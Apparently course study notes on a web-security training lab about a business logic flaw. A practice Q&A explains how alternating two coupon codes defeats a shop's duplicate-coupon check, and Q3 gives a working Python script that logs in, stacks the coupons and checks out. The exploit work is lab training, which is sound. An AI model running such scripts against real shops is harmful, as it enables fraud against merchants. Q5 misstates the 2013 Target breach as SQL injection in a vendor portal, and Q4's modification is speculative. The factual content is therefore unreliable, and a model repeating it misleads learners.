---
course: Web Security
topic: Business Logic Vulnerabilities
tags: [web-security]
---

## Practice Questions & Answers

**Q1. What is the primary goal of the lab "Flawed Enforcement of Business Rules"?**

The primary goal of the lab "Flawed Enforcement of Business Rules" is to exploit a logic flaw in the purchasing workflow to buy a specific item (lightweight leather jacket) for less than its intended price. The user needs to manipulate the coupon system to reduce the price below the available store credit.

**Q2. How did you identify the vulnerability in the coupon system?**

To identify the vulnerability in the coupon system, I tested the application by applying multiple coupons and observed the behavior. Initially, applying the same coupon multiple times was not allowed. However, alternating between different coupons revealed that the application only checked the most recent coupon, allowing repeated application of the same coupon in an alternating pattern.

**Q3. Explain the steps involved in scripting the exploitation process in Python.**

To script the exploitation process in Python, follow these steps:

1. **Import Libraries**: Import necessary libraries such as `requests`, `urllib3`, `BeautifulSoup`, and `re`.
2. **Disable Warnings**: Disable insecure request warnings.
3. **Set Proxies**: Configure proxies to direct traffic through Burp Suite.
4. **Main Function**: Define the main function to handle command-line arguments and call the `buy_item` function.
5. **Get CSRF Token**: Create a function `get_csrf_token` to extract the CSRF token from the login page.
6. **Login**: Use the `get_csrf_token` function to retrieve the CSRF token and perform a POST request to log in.
7. **Add Item to Cart**: Perform a POST request to add the desired item to the cart.
8. **Apply Coupons**: Use a loop to alternate between applying the $5 coupon and the 30% off coupon.
9. **Checkout**: Perform a final POST request to checkout the item.
10. **Check Success**: Verify if the response contains the "congratulations" message to confirm successful exploitation.

Here is a sample script:

```python
import requests
from bs4 import BeautifulSoup
import urllib3
import sys

# Disable insecure request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_csrf_token(session, url):
    response = session.get(url + "/login", verify=False)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf'})['value']
    return csrf_token

def buy_item(session, url):
    # Login
    csrf_token = get_csrf_token(session, url)
    login_data = {
        'csrf': csrf_token,
        'username': 'Peter',
        'password': 'Peter'
    }
    response = session.post(url + "/login", data=login_data, verify=False)
    
    # Add item to cart
    cart_data = {
        'product_id': 1,
        'redirect': 'product',
        'quantity': 1
    }
    session.post(url + "/cart", data=cart_data, verify=False)
    
    # Apply coupons
    for i in range(8):
        if i % 2 == 0:
            coupon_code = 'newcost5'
        else:
            coupon_code = 'signup30'
        
        csrf_token = get_csrf_token(session, url + "/cart")
        coupon_data = {
            'csrf': csrf_token,
            'coupon': coupon_code
        }
        session.post(url + "/cart/coupon", data=coupon_data, verify=False)
    
    # Checkout
    csrf_token = get_csrf_token(session, url + "/cart")
    checkout_data = {
        'csrf': csrf_token
    }
    response = session.post(url + "/checkout", data=checkout_data, verify=False)
    
    if "Congratulations" in response.text:
        print("Successfully exploited the business logic vulnerability.")
    else:
        print("Could not exploit the business logic vulnerability.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <URL>")
        print(f"Example: {sys.argv[0]} http://www.example.com")
        sys.exit(1)
    
    url = sys.argv[1]
    session = requests.Session()
    buy_item(session, url)
```

**Q4. How would you modify the script to handle a scenario where the application uses a different method to validate coupons?**

To modify the script for a different validation method, you would need to adjust the logic for applying coupons. For example, if the application validates coupons based on a unique identifier rather than just the most recent coupon, you would need to track and manage unique identifiers for each coupon application.

Here’s an example modification:

```python
def buy_item(session, url):
    # ... (same as above until applying coupons)
    
    # Apply coupons with unique identifiers
    for i in range(8):
        if i % 2 == 0:
            coupon_code = 'newcost5'
        else:
            coupon_code = 'signup30'
        
        csrf_token = get_csrf_token(session, url + "/cart")
        coupon_data = {
            'csrf': csrf_token,
            'coupon': coupon_code,
            'unique_id': f'uid_{i}'  # Unique identifier for each coupon application
        }
        session.post(url + "/cart/coupon", data=coupon_data, verify=False)
    
    # ... (rest of the script remains the same)
```

**Q5. Discuss a real-world example of a business logic vulnerability and how it was exploited.**

A notable real-world example is the **Target Data Breach** in 2013, where attackers exploited a business logic vulnerability in Target's HVAC vendor portal. The attackers gained access to the network by exploiting a SQL injection vulnerability in the vendor portal, which allowed them to escalate privileges and access sensitive data. This breach compromised millions of customer records, leading to significant financial and reputational damage.

In this case, the business logic flaw was the lack of proper authentication and authorization mechanisms for third-party vendors accessing internal systems. By exploiting this flaw, the attackers were able to gain unauthorized access and steal sensitive information.

**Q6. How can organizations prevent business logic vulnerabilities like the one in the lab?**

Organizations can prevent business logic vulnerabilities by implementing the following best practices:

1. **Code Reviews**: Regularly review code to ensure business logic is correctly implemented and free from logical flaws.
2. **Security Testing**: Conduct thorough security testing, including penetration testing and fuzz testing, to identify potential business logic vulnerabilities.
3. **Access Controls**: Implement strict access controls and authentication mechanisms to prevent unauthorized access to critical systems.
4. **Logging and Monitoring**: Maintain comprehensive logging and monitoring to detect and respond to suspicious activities promptly.
5. **Training and Awareness**: Educate developers and stakeholders about common business logic vulnerabilities and best practices for prevention.

By adhering to these practices, organizations can significantly reduce the risk of business logic vulnerabilities and protect their systems and data from exploitation.

---
<!-- nav -->
[[05-Placing the Order|Placing the Order]] | [[Web Security (PortSwigger)/15-Business Logic Vulnerabilities/05-Lab 4 Flawed enforcement of business rules/00-Overview|Overview]]
